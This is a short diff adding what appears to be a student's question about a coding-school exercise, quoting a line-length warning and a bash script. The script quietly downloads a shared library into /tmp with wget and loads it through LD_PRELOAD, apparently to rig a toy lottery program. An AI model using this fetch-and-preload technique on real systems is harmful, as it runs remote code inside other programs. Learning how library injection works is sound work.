@@ -1,0 +1,9 @@
+s the error message : 
+ ========== 101-make_me_win.sh ==========
+101-make_me_win.sh:2: WARNING: line over 80 characters (120)
+total: 0 errors, 1 warnings, 3 lines checked
+
+code fille   101-make_me_win.sh  : 
+#!/bin/bash
+wget -q -P /tmp https://github.com/zouhairmariouate01/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hack.so
+export LD_PRELOAD=/tmp/hack.so
